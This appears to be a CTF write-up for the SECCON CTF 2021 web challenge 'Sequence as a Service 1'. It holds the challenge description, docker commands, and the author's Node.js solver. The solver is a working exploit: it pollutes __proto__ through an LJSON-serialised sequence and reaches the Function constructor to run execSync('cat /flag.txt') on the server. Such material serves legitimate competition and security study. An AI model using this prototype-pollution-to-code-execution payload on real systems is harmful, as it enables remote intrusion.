---
title: "Sequence As A Service 1 - SECCON CTF 2021"
category: "web"
subcategory: "prototype-pollution"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "prototype-pollution", "sequence", "service", "web", "seccon-ctf-2021"]
summary: "I've heard that SaaS is very popular these days."
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202112_SECCON_CTF_2021/web/sequence-as-a-service-1"
license: "none stated"
ctf:
  name: "SECCON CTF 2021"
  year: 2021
  challenge: "Sequence As A Service 1"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202112_SECCON_CTF_2021/web/sequence-as-a-service-1>
- **CTF:** SECCON CTF 2021

---

# [web] Sequence as a Service 1

## Description

I've heard that SaaS is very popular these days. So, I developed it, too. You can access it `[here](http://sequence-as-a-service-1.quals.seccon.jp:3000)`.

Note: It is possible to solve SaaS 2 even if you don't solve SaaS 1.

## Attachments

- [dist](files/dist)

## Usage

Launch a challenge server:

```
docker compose up
```

Run the author's solver:

```
docker run -it \
    -e SECCON_URL=http://localhost:3000 \
    --network=host \
    (docker build -q ./solver)
```


## Solver: `index.js`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202112_SECCON_CTF_2021/web/sequence-as-a-service-1/solver/index.js>

```javascript
const LJSON = require("ljson");
const fetch = (...args) =>
  import("node-fetch").then(({ default: fetch }) => fetch(...args));

const fail = (message) => {
  console.error(message);
  return process.exit(1);
};

const SECCON_URL = process.env.SECCON_URL || fail("SECCON_URL not found");

const code =
  'return global.process.mainModule.constructor._load("child_process").execSync("cat /flag.txt").toString()';

let evilSequence = LJSON.stringify(($, n) =>
  $(
    ",",
    $("set", $("self"), "__proto__", $),
    $("constructor", code)()
  )
);

const params = new URLSearchParams({
  sequence: evilSequence,
  n: 0,
});

const main = async () => {
  const text = await (
    await fetch(`${SECCON_URL}/api/getValue?${params}`)
  ).text();
  console.log(text);
};
main();
```
